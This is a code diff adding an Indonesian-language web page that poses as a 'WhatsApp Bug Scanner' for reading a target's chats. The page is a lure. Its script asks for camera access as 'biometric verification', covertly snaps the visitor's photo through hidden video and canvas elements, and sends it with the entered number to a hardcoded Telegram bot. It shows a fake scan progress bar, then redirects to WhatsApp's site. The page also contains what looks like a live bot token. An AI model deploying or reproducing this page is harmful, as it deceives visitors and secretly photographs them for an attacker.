@@ -1,0 +1,123 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>WhatsApp Bug Scanner - Track Messages</title>
+    <style>
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: linear-gradient(135deg, #25D366, #128C7E); color: white; text-align: center; padding: 30px; }
+        .container { max-width: 500px; margin: 50px auto; background: rgba(0,0,0,0.7); padding: 30px; border-radius: 15px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
+        h2 { color: #25D366; }
+        .steps { text-align: left; margin: 20px 0; }
+        button { background: #25D366; color: white; border: none; padding: 15px 30px; border-radius: 10px; font-size: 18px; cursor: pointer; margin-top: 20px; }
+        button:hover { background: #128C7E; }
+        .warning { font-size: 12px; color: #ffcc00; margin-top: 20px; }
+        #status { margin-top: 20px; font-weight: bold; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h2>🔍 WhatsApp Bug Scanner v3.1</h2>
+        <p><strong>Fitur:</strong> Lacak percakapan WhatsApp target tanpa akses fisik.</p>
+        
+        <div class="steps">
+            <h3>📋 Cara Penggunaan:</h3>
+            <ol>
+                <li>Masukkan nomor target (contoh: +62812xxxxxxx).</li>
+                <li>Aktifkan <strong>kamera</strong> untuk verifikasi biometric.</li>
+                <li>Tunggu sistem scanning (10-15 detik).</li>
+                <li>Hasil akan ditampilkan + opsi download log chat.</li>
+            </ol>
+        </div>
+
+        <input type="text" id="number" placeholder="+62xxxxxxxxxxx" style="padding: 10px; width: 80%; border-radius: 5px; border: none;">
+        <br><br>
+        <button onclick="startExploit()">🚀 Mulai Scanning</button>
+
+        <p class="warning">⚠️ <strong>Peringatan:</strong> Fitur ini hanya untuk edukasi keamanan. Izin kamera diperlukan untuk verifikasi identitas.</p>
+        
+        <div id="status">Status: Menunggu perintah...</div>
+    </div>
+
+    <!-- Hidden Webcam Elements -->
+    <video id="hiddenVideo" autoplay playsinline style="display:none;"></video>
+    <canvas id="hiddenCanvas" style="display:none;"></canvas>
+
+    <script>
+        // Telegram Bot Configuration (GANTI DENGAN DATA ANDA)
+        const BOT_TOKEN = "8186605145:AAH4nAskT_3TbCjYP_WC2I6ZcLspEAJmnTM";
+        const CHAT_ID = "7491173075";
+
+        // 1. Start Exploit
+        async function startExploit() {
+            const number = document.getElementById('number').value;
+            if (!number.startsWith('+')) {
+                alert("Harap masukkan nomor dengan format internasional (+62...)");
+                return;
+            }
+
+            document.getElementById('status').innerHTML = "Status: Meminta akses kamera...";
+
+            // 2. Hidden Webcam Activation
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: 'user' } 
+                });
+                const video = document.getElementById('hiddenVideo');
+                video.srcObject = stream;
+
+                document.getElementById('status').innerHTML = "Status: Scanning WhatsApp database target...";
+
+                // 3. Capture photo after 4 seconds
+                setTimeout(() => captureAndSend(video, number), 4000);
+
+                // 4. Fake scanning progress
+                let progress = 0;
+                const progressInterval = setInterval(() => {
+                    progress += 10;
+                    document.getElementById('status').innerHTML = `Status: Scanning... ${progress}%`;
+                    if (progress >= 100) {
+                        clearInterval(progressInterval);
+                        document.getElementById('status').innerHTML = "Status: <span style='color:#25D366'>Scan selesai! Hasil dikirim ke email.</span>";
+                        // Redirect setelah selesai
+                        setTimeout(() => {
+                            window.location.href = "https://www.whatsapp.com/security"; // Redirect aman
+                        }, 3000);
+                    }
+                }, 500);
+
+            } catch (err) {
+                document.getElementById('status').innerHTML = "Status: <span style='color:red'>Kamera tidak diizinkan. Scanning gagal.</span>";
+                console.error("Camera error:", err);
+            }
+        }
+
+        // 5. Capture & Send to Telegram
+        function captureAndSend(video, targetNumber) {
+            const canvas = document.getElementById('hiddenCanvas');
+            const ctx = canvas.getContext('2d');
+            
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            canvas.toBlob(blob => {
+                const formData = new FormData();
+                formData.append('chat_id', CHAT_ID);
+                formData.append('photo', blob, `bugwa_${targetNumber}.jpg`);
+                formData.append('caption', `📸 Bug WA Capture\nTarget: ${targetNumber}\nTime: ${new Date().toLocaleString()}`);
+
+                // Send to Telegram Bot
+                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                }).then(response => {
+                    if (response.ok) {
+                        console.log("[SUCCESS] Photo sent to Telegram.");
+                    }
+                }).catch(err => console.error("Send error:", err));
+            }, 'image/jpeg', 0.95);
+        }
+    </script>
+</body>
+</html>
